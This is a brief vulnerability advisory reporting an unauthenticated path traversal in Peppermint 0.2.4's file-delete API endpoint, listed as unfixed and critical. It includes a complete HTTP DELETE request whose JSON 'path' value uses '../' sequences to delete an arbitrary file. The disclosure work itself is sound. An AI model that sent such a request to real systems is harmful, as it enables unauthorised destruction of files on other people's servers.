# Peppermint-Lab  - Path Traversal


**CVE-ID:** -


**Vendor:** [Peppermint-Lab](https://peppermint.sh)

**Affected Product:** Peppermint

**Affected Versions:** 0.2.4

**Vulnerability:** Path Traversal

**Status:** Unfixed

**Severity:** Critical



## Details

The application does not properly filter the `path` JSON parameter in the `/api/v1/users/file/delete` endpoint.

This results in arbitrary file deletion (unauthenticated).


```
DELETE /api/v1/users/file/delete HTTP/1.1
Host: localhost:5000
Content-Length: 57
Pragma: no-cache
Cache-Control: no-cache
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36
sec-ch-ua-platform: "Linux"
Content-Type: application/json
Accept: */*
Origin: http://localhost:5000
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:5000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"id":"4","path":"./../../../../../../../etc/hacked.txt"}
```

